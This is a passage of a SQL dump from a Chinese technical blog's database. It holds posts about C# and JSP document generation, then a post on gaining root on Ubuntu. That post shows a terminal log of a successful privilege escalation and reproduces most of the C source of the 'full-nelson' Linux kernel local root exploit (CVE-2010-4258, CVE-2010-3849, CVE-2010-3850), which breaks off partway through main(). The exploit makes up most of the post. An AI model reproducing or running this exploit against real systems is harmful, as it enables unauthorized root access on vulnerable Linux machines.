{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(\"2+3=\" + calc.Add(2, 3));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(102,'使用JSP动态生成WORD和Excel文档','33731937200832311237189',2,'2008-04-23 01:12:37',NULL,'2008-04-23 01:12:37','2014-07-13 18:57:13','<p>1。testDoc.jsp</p>  <p>新建Word文档test.doc，然后插入表格，输入个人信息<br />&nbsp;文件-〉另存为testDoc.jsp<br />&nbsp;打开testDoc.jsp，在第一行加入<br />&lt;<a href=\"mailto:%@page\" rel=\"nofollow\">%@page</a> contentType=\"application/msword;charset=gb2312\" %&gt; </p>  <p>2。testXls.jsp</p>  <p>新建Excel文档test.xls，然后插入数据<br />&nbsp;文件-〉另存为testXls.jsp<br />&nbsp;打开testXls.jsp，在第一行加入：<br />&lt;<a href=\"mailto:%@page\" rel=\"nofollow\">%@page</a> contentType=\"application/vnd.ms-excel;charset=gb2312\" %&gt;</p>  <p>然后在jsp页面中找到对应的字段用Jsp Script代替掉。</p>  <p>注：得到的doc为web版式视图，切换到页面视图即可<br /></p>',1,1,1,0,0,0,'1。testDoc.jsp  新建Word文档test.doc，然后插入表格，输入个人信息&nbsp;文件-〉另存为testDoc.jsp&nbsp;打开testDoc.jsp，在第一行加入&lt;%@page contentType=\"application/msword;charset=gb2312\" %&gt;   2。testXls.jsp  新建Excel文档test.xls，然后插入数据&nbsp;文件-〉另存为testXls.jsp&nbsp;打开testXls.jsp，在第一行加入：&lt;%@page contentType=\"application/vnd.ms-excel;charset=gb2312\" %&gt;  然后在jsp页面中找到对应的字段用Jsp Script代替掉。  注：得到的doc为web版式视图，切换到页面视图即可','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(103,'ubuntu提升权限漏洞获取root','337319372010111010463570',2,'2010-12-10 22:46:41',NULL,'2010-12-10 22:46:41','2014-07-13 18:57:13','ECONET协议的漏洞，可以获得root权限，在Ubuntu10.04上测试失败，在Ubuntu11.04上测试成功，好像要2.6.32以上版本的内核下才能用。<br />hankjin@ysmonk:~$ gcc econ.c<br />hankjin@ysmonk:~$ uname -r<br />2.6.37-7-generic<br />hankjin@ysmonk:~$ ./a.out<br />[*] Resolving kernel addresses...<br />&nbsp;[+] Resolved econet_ioctl to 0xf82fce10<br />&nbsp;[+] Resolved econet_ops to 0xf82fd3a0<br />&nbsp;[+] Resolved commit_creds to 0xc01749d0<br />&nbsp;[+] Resolved prepare_kernel_cred to 0xc0174c40<br />[*] Calculating target...<br />[*] Failed to set Econet address.<br />[*] Triggering payload...<br />[*] Got root!<br /># whoami<br />root<br /># <br /><br />/*<br />&nbsp;* Linux Kernel &lt;= 2.6.37 local privilege escalation<br />&nbsp;* by Dan Rosenberg<br />&nbsp;* @djrbliss on twitter<br />&nbsp;*<br />&nbsp;* Usage:<br />&nbsp;* gcc full-nelson.c -o full-nelson<br />&nbsp;* ./full-nelson<br />&nbsp;*<br />&nbsp;* This exploit leverages three vulnerabilities to get root, all of which were<br />&nbsp;* discovered by Nelson Elhage:<br />&nbsp;*<br />&nbsp;* CVE-2010-4258<br />&nbsp;* -------------<br />&nbsp;* This is the interesting one, and the reason I wrote this exploit.&nbsp; If a<br />&nbsp;* thread is created via clone(2) using the CLONE_CHILD_CLEARTID flag, a NULL<br />&nbsp;* word will be written to a user-specified pointer when that thread exits.<br />&nbsp;* This write is done using put_user(), which ensures the provided destination<br />&nbsp;* resides in valid userspace by invoking access_ok().&nbsp; However, Nelson<br />&nbsp;* discovered that when the kernel performs an address limit override via<br />&nbsp;* set_fs(KERNEL_DS) and the thread subsequently OOPSes (via BUG, page fault,<br />&nbsp;* etc.), this override is not reverted before calling put_user() in the exit<br />&nbsp;* path, allowing a user to write a NULL word to an arbitrary kernel address.<br />&nbsp;* Note that this issue requires an additional vulnerability to trigger.<br />&nbsp;*<br />&nbsp;* CVE-2010-3849<br />&nbsp;* -------------<br />&nbsp;* This is a NULL pointer dereference in the Econet protocol.&nbsp; By itself, it\'s<br />&nbsp;* fairly benign as a local denial-of-service.&nbsp; It\'s a perfect candidate to<br />&nbsp;* trigger the above issue, since it\'s reachable via sock_no_sendpage(), which<br />&nbsp;* subsequently calls sendmsg under KERNEL_DS.<br />&nbsp;*<br />&nbsp;* CVE-2010-3850<br />&nbsp;* -------------<br />&nbsp;* I wouldn\'t be able to reach the NULL pointer dereference and trigger the<br />&nbsp;* OOPS if users weren\'t able to assign Econet addresses to arbitrary<br />&nbsp;* interfaces due to a missing capabilities check.<br />&nbsp;*<br />&nbsp;* In the interest of public safety, this exploit was specifically designed to<br />&nbsp;* be limited:<br />&nbsp;*<br />&nbsp;*&nbsp; * The particular symbols I resolve are not exported on Slackware or Debian<br />&nbsp;*&nbsp; * Red Hat does not support Econet by default<br />&nbsp;*&nbsp; * CVE-2010-3849 and CVE-2010-3850 have both been patched by Ubuntu and<br />&nbsp;*&nbsp;&nbsp;&nbsp; Debian<br />&nbsp;*<br />&nbsp;* However, the important issue, CVE-2010-4258, affects everyone, and it would<br />&nbsp;* be trivial to find an unpatched DoS under KERNEL_DS and write a slightly<br />&nbsp;* more sophisticated version of this that doesn\'t have the roadblocks I put in<br />&nbsp;* to prevent abuse by script kiddies.<br />&nbsp;*<br />&nbsp;* Tested on unpatched Ubuntu 10.04 kernels, both x86 and x86-64.<br />&nbsp;*<br />&nbsp;* NOTE: the exploit process will deadlock and stay in a zombie state after you<br />&nbsp;* exit your root shell because the Econet thread OOPSes while holding the<br />&nbsp;* Econet mutex.&nbsp; It wouldn\'t be too hard to fix this up, but I didn\'t bother.<br />&nbsp;*<br />&nbsp;* Greets to spender, taviso, stealth, pipacs, jono, kees, and bla<br />&nbsp;*/<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;sys/socket.h&gt;<br />#include &lt;fcntl.h&gt;<br />#include &lt;sys/ioctl.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;net/if.h&gt;<br />#include &lt;sched.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;signal.h&gt;<br />#include &lt;sys/utsname.h&gt;<br />#include &lt;sys/mman.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />/* How many bytes should we clear in our<br />&nbsp;* function pointer to put it into userspace? */<br />#ifdef __x86_64__<br />#define SHIFT 24<br />#define OFFSET 3<br />#else<br />#define SHIFT 8<br />#define OFFSET 1<br />#endif<br /><br />/* thanks spender... */<br />unsigned long get_kernel_sym(char *name)<br />{<br />&nbsp;&nbsp;&nbsp; FILE *f;<br />&nbsp;&nbsp;&nbsp; unsigned long addr;<br />&nbsp;&nbsp;&nbsp; char dummy;<br />&nbsp;&nbsp;&nbsp; char sname[512];<br />&nbsp;&nbsp;&nbsp; struct utsname ver;<br />&nbsp;&nbsp;&nbsp; int ret;<br />&nbsp;&nbsp;&nbsp; int rep = 0;<br />&nbsp;&nbsp;&nbsp; int oldstyle = 0;<br /><br />&nbsp;&nbsp;&nbsp; f = fopen(\"/proc/kallsyms\", \"r\");<br />&nbsp;&nbsp;&nbsp; if (f == NULL) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; f = fopen(\"/proc/ksyms\", \"r\");<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (f == NULL)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; goto fallback;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oldstyle = 1;<br />&nbsp;&nbsp;&nbsp; }<br /><br />repeat:<br />&nbsp;&nbsp;&nbsp; ret = 0;<br />&nbsp;&nbsp;&nbsp; while(ret != EOF) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (!oldstyle)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ret = fscanf(f, \"%p %c %s\\n\", (void **)&amp;addr, &amp;dummy, sname);<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ret = fscanf(f, \"%p %s\\n\", (void **)&amp;addr, sname);<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (ret == 2) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; char *p;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (strstr(sname, \"_O/\") || strstr(sname, \"_S.\"))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p = strrchr(sname, \'_\');<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (p &gt; ((char *)sname + 5) &amp;&amp; !strncmp(p - 3, \"smp\", 3)) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p = p - 4;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; while (p &gt; (char *)sname &amp;&amp; *(p - 1) == \'_\')<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; p--;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; *p = \'\\0\';<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (ret == 0) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fscanf(f, \"%s\\n\", sname);<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (!strcmp(name, sname)) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fprintf(stdout, \" [+] Resolved %s to %p%s\\n\", name, (void *)addr, rep ? \" (via System.map)\" : \"\");<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fclose(f);<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return addr;<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp; fclose(f);<br />&nbsp;&nbsp;&nbsp; if (rep)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return 0;<br />fallback:<br />&nbsp;&nbsp;&nbsp; uname(&amp;ver);<br />&nbsp;&nbsp;&nbsp; if (strncmp(ver.release, \"2.6\", 3))<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oldstyle = 1;<br />&nbsp;&nbsp;&nbsp; sprintf(sname, \"/boot/System.map-%s\", ver.release);<br />&nbsp;&nbsp;&nbsp; f = fopen(sname, \"r\");<br />&nbsp;&nbsp;&nbsp; if (f == NULL)<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return 0;<br />&nbsp;&nbsp;&nbsp; rep = 1;<br />&nbsp;&nbsp;&nbsp; goto repeat;<br />}<br /><br />typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);<br />typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);<br />_commit_creds commit_creds;<br />_prepare_kernel_cred prepare_kernel_cred;<br /><br />static int __attribute__((regparm(3)))<br />getroot(void * file, void * vma)<br />{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commit_creds(prepare_kernel_cred(0));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;<br /><br />}<br /><br />/* Why do I do this?&nbsp; Because on x86-64, the address of<br />&nbsp;* commit_creds and prepare_kernel_cred are loaded relative<br />&nbsp;* to rip, which means I can\'t just copy the above payload<br />&nbsp;* into my landing area. */<br />void __attribute__((regparm(3)))<br />trampoline()<br />{<br /><br />#ifdef __x86_64__<br />&nbsp;&nbsp;&nbsp; asm(\"mov $getroot, %rax; call *%rax;\");<br />#else<br />&nbsp;&nbsp;&nbsp; asm(\"mov $getroot, %eax; call *%eax;\");<br />#endif<br /><br />}<br /><br />/* Triggers a NULL pointer dereference in econet_sendmsg<br />&nbsp;* via sock_no_sendpage, so it\'s under KERNEL_DS */<br />int trigger(int * fildes)<br />{<br />&nbsp;&nbsp;&nbsp; int ret;<br />&nbsp;&nbsp;&nbsp; struct ifreq ifr;<br /><br />&nbsp;&nbsp;&nbsp; memset(&amp;ifr, 0, sizeof(ifr));<br />&nbsp;&nbsp;&nbsp; strncpy(ifr.ifr_name, \"eth0\", IFNAMSIZ);<br /><br />&nbsp;&nbsp;&nbsp; ret = ioctl(fildes[2], SIOCSIFADDR, &amp;ifr);<br /><br />&nbsp;&nbsp;&nbsp; if(ret &lt; 0) {<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; printf(\"[*] Failed to set Econet address.\\n\");<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return -1;<br />&nbsp;&nbsp;&nbsp; }<br /><br />&nbsp;&nbsp;&nbsp; splice(fildes[3], NULL, fildes[1], NULL, 128, 0);<br />&nbsp;&nbsp;&nbsp; splice(fildes[0], NULL, fildes[2], NULL, 128, 0);<br /><br />&nbsp;&nbsp;&nbsp; /* Shouldn\'t get here... */<br />&nbsp;&nbsp;&nbsp; exit(0);<br />}<br /><br />int main(int argc, char * argv[])<br />{<br />&nbsp;&nbsp;&nbsp; unsigned long econet_ops, econet_ioctl, target, landing;<br />&nbsp;&nbsp;&nbsp; int fildes[4], pid;<br />&nbsp;&nbsp;&nbsp; void * newstack, * payload;<br /><br />&nbsp;&nbsp;&nbsp; /* Create file descriptors now so there are two<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; references to them after cloning...otherwise<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; the child will never return because it<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; deadlocks when trying to unlock various<br />&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; mutexes after OOPSing */<br />&nbsp;&nbsp;&nbsp; pipe(fildes);<br />&nbsp;&nbsp;&nbsp; fildes[2] = socket(PF_ECONET, SOCK_DGRA